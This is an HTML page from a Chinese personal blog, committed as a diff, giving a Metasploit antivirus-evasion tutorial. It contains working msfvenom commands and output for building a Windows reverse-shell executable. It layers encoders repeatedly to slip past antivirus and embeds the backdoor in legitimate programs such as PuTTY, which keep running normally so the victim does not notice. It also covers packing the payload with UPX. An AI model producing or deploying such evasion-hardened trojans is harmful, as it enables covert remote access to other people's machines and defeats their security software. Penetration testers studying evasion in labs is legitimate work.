@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="banbird">
+
+
+    <meta name="subtitle" content="Peace & Love">
+
+
+    <meta name="description" content="愿有人陪你颠沛流离">
+
+
+
+<title>metasploit免杀技巧 | Blacknight</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">blacknight&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">blacknight&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">metasploit免杀技巧</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">banbird</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 28, 2020&nbsp;&nbsp;12:30:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="msf生成可独立运行二进制文件"><a href="#msf生成可独立运行二进制文件" class="headerlink" title="msf生成可独立运行二进制文件"></a>msf生成可独立运行二进制文件</h3><p>以windows可执行文件为例，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.48.128 LPORT&#x3D;8080 -f exe -o payload.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728101445.png" alt=""></p>
+<p>这样就生成了一个windows上可执行的反弹shell程序，然后可以使用<strong>multi/handler</strong>模块在MSF终端启动一个监听器，对反弹连接进行监听和处理。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728104422.png" alt=""></p>
+<p>之后在windows上运行exe文件即可建立会话</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728104521.png" alt=""></p>
+<h3 id="躲避杀毒软件检测"><a href="#躲避杀毒软件检测" class="headerlink" title="躲避杀毒软件检测"></a>躲避杀毒软件检测</h3><h4 id="使用msf编码器"><a href="#使用msf编码器" class="headerlink" title="使用msf编码器"></a>使用msf编码器</h4><p>MSF编码器将原始的可执行程序重新编码，并生成一个新的二进制文件，当这个文件运行后，MSF编码器会将原始程序解码到内存中执行</p>
+<p>使用<code>msfvenom -l encoders</code>列出所有可用的编码格式，可以看到除了名称和描述外，msf还给每个编码器评定了等级（注意不同的编码格式适用于不同的操作系统平台）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;opt# msfvenom -l encoders</span><br><span class="line"></span><br><span class="line">Framework Encoders [--encoder &lt;value&gt;]</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Name                          Rank       Description</span><br><span class="line">    ----                          ----       -----------</span><br><span class="line">    cmd&#x2F;brace                     low        Bash Brace Expansion Command Encoder</span><br><span class="line">    cmd&#x2F;echo                      good       Echo Command Encoder</span><br><span class="line">    cmd&#x2F;generic_sh                manual     Generic Shell Variable Substitution Command Encoder</span><br><span class="line">    cmd&#x2F;ifs                       low        Bourne $&#123;IFS&#125; Substitution Command Encoder</span><br><span class="line">    cmd&#x2F;perl                      normal     Perl Command Encoder</span><br><span class="line">    cmd&#x2F;powershell_base64         excellent  Powershell Base64 Command Encoder</span><br><span class="line">    cmd&#x2F;printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder</span><br><span class="line">    generic&#x2F;eicar                 manual     The EICAR Encoder</span><br><span class="line">    generic&#x2F;none                  normal     The &quot;none&quot; Encoder</span><br><span class="line">    mipsbe&#x2F;byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsbe&#x2F;longxor                normal     XOR Encoder</span><br><span class="line">    mipsle&#x2F;byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsle&#x2F;longxor                normal     XOR Encoder</span><br><span class="line">    php&#x2F;base64                    great      PHP Base64 Encoder</span><br><span class="line">    ppc&#x2F;longxor                   normal     PPC LongXOR Encoder</span><br><span class="line">    ppc&#x2F;longxor_tag               normal     PPC LongXOR Encoder</span><br><span class="line">    ruby&#x2F;base64                   great      Ruby Base64 Encoder</span><br><span class="line">    sparc&#x2F;longxor_tag             normal     SPARC DWORD XOR Encoder</span><br><span class="line">    x64&#x2F;xor                       normal     XOR Encoder</span><br><span class="line">    x64&#x2F;xor_context               normal     Hostname-based Context Keyed Payload Encoder</span><br><span class="line">    x64&#x2F;xor_dynamic               normal     Dynamic key XOR Encoder</span><br><span class="line">    x64&#x2F;zutto_dekiru              manual     Zutto Dekiru</span><br><span class="line">    x86&#x2F;add_sub                   manual     Add&#x2F;Sub Encoder</span><br><span class="line">    x86&#x2F;alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">    x86&#x2F;alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">    x86&#x2F;avoid_underscore_tolower  manual     Avoid underscore&#x2F;tolower</span><br><span class="line">    x86&#x2F;avoid_utf8_tolower        manual     Avoid UTF8&#x2F;tolower</span><br><span class="line">    x86&#x2F;bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</span><br><span class="line">    x86&#x2F;bmp_polyglot              manual     BMP Polyglot</span><br><span class="line">    x86&#x2F;call4_dword_xor           normal     Call+4 Dword XOR Encoder</span><br><span class="line">    x86&#x2F;context_cpuid             manual     CPUID-based Context Keyed Payload Encoder</span><br><span class="line">    x86&#x2F;context_stat              manual     stat(2)-based Context Keyed Payload Encoder</span><br><span class="line">    x86&#x2F;context_time              manual     time(2)-based Context Keyed Payload Encoder</span><br><span class="line">    x86&#x2F;countdown                 normal     Single-byte XOR Countdown Encoder</span><br><span class="line">    x86&#x2F;fnstenv_mov               normal     Variable-length Fnstenv&#x2F;mov Dword XOR Encoder</span><br><span class="line">    x86&#x2F;jmp_call_additive         normal     Jump&#x2F;Call XOR Additive Feedback Encoder</span><br><span class="line">    x86&#x2F;nonalpha                  low        Non-Alpha Encoder</span><br><span class="line">    x86&#x2F;nonupper                  low        Non-Upper Encoder</span><br><span class="line">    x86&#x2F;opt_sub                   manual     Sub Encoder (optimised)</span><br><span class="line">    x86&#x2F;service                   manual     Register Service</span><br><span class="line">    x86&#x2F;shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">    x86&#x2F;single_static_bit         manual     Single Static Bit</span><br><span class="line">    x86&#x2F;unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">    x86&#x2F;unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br><span class="line">    x86&#x2F;xor_dynamic               normal     Dynamic key XOR Encoder</span><br></pre></td></tr></table></figure>
+
+<p>生成攻击载荷时使用<code>-e</code>指定使用编码器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728110342.png" alt=""></p>
+<h4 id="多重编码"><a href="#多重编码" class="headerlink" title="多重编码"></a>多重编码</h4><p>MSF允许对攻击载荷文件进行多次编码，以降低被杀毒软件检测的风险</p>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;opt# msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.48.128 LPORT&#x3D;8080 -e x86&#x2F;shikata_ga_nai -i 10 -f raw|msfvenom -e x86&#x2F;alpha_upper -a x86 --platform windows -i 5 -f raw|msfvenom -e x86&#x2F;shikata_ga_nai -a x86 --platform windows -i 10 -f raw|msfvenom -e x86&#x2F;countdown -a x86 --platform windows -i 10 -f exe -o payload.exe</span><br><span class="line">Attempting to read payload from STDIN...Attempting to read payload from STDIN...</span><br><span class="line">Attempting to read payload from STDIN...</span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 10 iterations of x86&#x2F;shikata_ga_nai</span><br><span class="line">x86&#x2F;shikata_ga_nai succeeded with size 351 (iteration&#x3D;0)</span><br><span class="line">...</span><br><span class="line">x86&#x2F;shikata_ga_nai succeeded with size 594 (iteration&#x3D;9)</span><br><span class="line">x86&#x2F;shikata_ga_nai chosen with final size 594</span><br><span class="line">Payload size: 594 bytes</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 5 iterations of x86&#x2F;alpha_upper</span><br><span class="line">x86&#x2F;alpha_upper succeeded with size 1255 (iteration&#x3D;0)</span><br><span class="line">...</span><br><span class="line">x86&#x2F;alpha_upper succeeded with size 21115 (iteration&#x3D;4)</span><br><span class="line">x86&#x2F;alpha_upper chosen with final size 21115</span><br><span class="line">Payload size: 21115 bytes</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 10 iterations of x86&#x2F;shikata_ga_nai</span><br><span class="line">x86&#x2F;shikata_ga_nai succeeded with size 21144 (iteration&#x3D;0)</span><br><span class="line">...</span><br><span class="line">x86&#x2F;shikata_ga_nai succeeded with size 21405 (iteration&#x3D;9)</span><br><span class="line">x86&#x2F;shikata_ga_nai chosen with final size 21405</span><br><span class="line">Payload size: 21405 bytes</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 10 iterations of x86&#x2F;countdown</span><br><span class="line">x86&#x2F;countdown succeeded with size 21423 (iteration&#x3D;0)</span><br><span class="line">...</span><br><span class="line">x86&#x2F;countdown succeeded with size 21585 (iteration&#x3D;9)</span><br><span class="line">x86&#x2F;countdown chosen with final size 21585</span><br><span class="line">Payload size: 21585 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Saved as: payload.exe</span><br><span class="line">root@kali:&#x2F;opt#</span><br></pre></td></tr></table></figure>
+
+<p>这里我们先使用了10次<strong>shikata_ga_na</strong>i编码，将编码后的原始数据又进行了5次<strong>alpha_upper</strong>编码，然后再进行10次<strong>shika_ga_nai</strong>编码，接着进行10次<strong>countdown</strong>编码，最后生成可执行文件。</p>
+<h4 id="自定义可执行文件模板"><a href="#自定义可执行文件模板" class="headerlink" title="自定义可执行文件模板"></a>自定义可执行文件模板</h4><p>通常情况下执行<strong>msfvenom</strong>命令时，攻击载荷将被嵌入到位于data/templates/template.exe的默认的可执行文件模板中，虽然这个模板文件会更新，但它永远是杀毒软件的重点关注对象</p>
+<p>当前的<strong>msfvenom</strong>支持使用<strong>-x</strong>选项使用任意的windows可执行程序来代替默认模板文件，下面的例子中我们可以重新对攻击载荷进行编码，并将微软Sysinternals套件中的Process Explorer程序作为自定义的可执行程序模块</p>
+<p>首先从Microsoft网站下载Process Explorer软件并解压</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.sysinternals.com&#x2F;files&#x2F;ProcessExplorer.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728113424.png" alt=""></p>
+<p>接着指定模板文件生成攻击载荷</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728113626.png" alt=""></p>
+<p>虽然现在病毒库日益强大，但补发一些不重视安全性的用户仍然使用着旧版本的病毒库</p>
+<h4 id="隐秘的启动一个攻击载荷"><a href="#隐秘的启动一个攻击载荷" class="headerlink" title="隐秘的启动一个攻击载荷"></a>隐秘的启动一个攻击载荷</h4><p>如果用户运行了你的后门执行文件但却什么都没发生，很容易就会引起怀疑，为了避免被目标察觉，可以在启动攻击载荷的同时，让宿主程序也正常的运行起来</p>
+<p>MSF中使用选项-k会配置攻击载荷在一个独立线程中启动，这样宿主程序在执行时不会收到影响。</p>
+<p>以ssh客户端Putty为例</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728120024.png" alt=""></p>
+<p>在msf建立监听，靶机执行文件试试效果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728120324.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728120427.png" alt=""></p>
+<p>可以看到成功打开了shell，而且用户软件可以正常显示和使用。</p>
+<h4 id="加壳软件"><a href="#加壳软件" class="headerlink" title="加壳软件"></a>加壳软件</h4><p>加壳软件是一种能够对可执行文件进行加密压缩并将压缩代码嵌入其中的工具，当加过壳的文件被执行后，解压代码会从已压缩的数据中重建原始程序并运行。这些过程对用户是透明的，所以加壳后的程序可以代替原始程序使用。</p>
+<p>下面使用UPX加壳软件对我们的攻击载荷文件进行编码和压缩，以尝试对该文件进行免杀处理</p>
+<p>执行<code>upx</code>命令查看它支持哪些选项</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728121123.png" alt=""></p>
+<p>使用<strong>-5</strong>选项对我们的可执行文件进行压缩并加壳</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728121426.png" alt=""></p>
+<p>可以看见upx将我们的原始攻击文件体积进行了压缩。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>banbird</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.blacknight.top/2020/07/28/msf_note5/">http://www.blacknight.top/2020/07/28/msf_note5/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/metasploit/"># metasploit</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/07/27/msf_note4/">meterpreter基本使用</a>
+            
+        </section>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: '8biphXJF0NRr0Xnr2pEPIjYa-gzGzoHsz',
+      app_key: '0RbmT7aNG8nj44MHrGMt9JFk',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+    </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© banbird | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
